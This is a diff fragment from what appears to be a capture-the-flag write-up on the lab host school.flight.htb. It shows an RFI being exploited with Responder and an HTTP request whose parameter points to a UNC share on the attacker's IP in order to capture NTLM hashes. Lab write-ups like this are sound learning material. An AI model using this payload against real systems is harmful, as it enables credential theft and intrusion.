@@ -256,11 +256,13 @@ Confirmed RFI
 
 To exploit this i can use responder to try and capture a hash
 
+https://wise-forensics.com/2025/01/28/local-file-inclusion-lfi-remote-file-inclusion-rfi/
+
 ## Capturing NTLM hash
 ```python
 sudo responder -I tun0
 ```
-
+Ill start up responder
 ```python
 GET /index.php?view=//10.10.14.90/share/test.txt HTTP/1.1
 Host: school.flight.htb
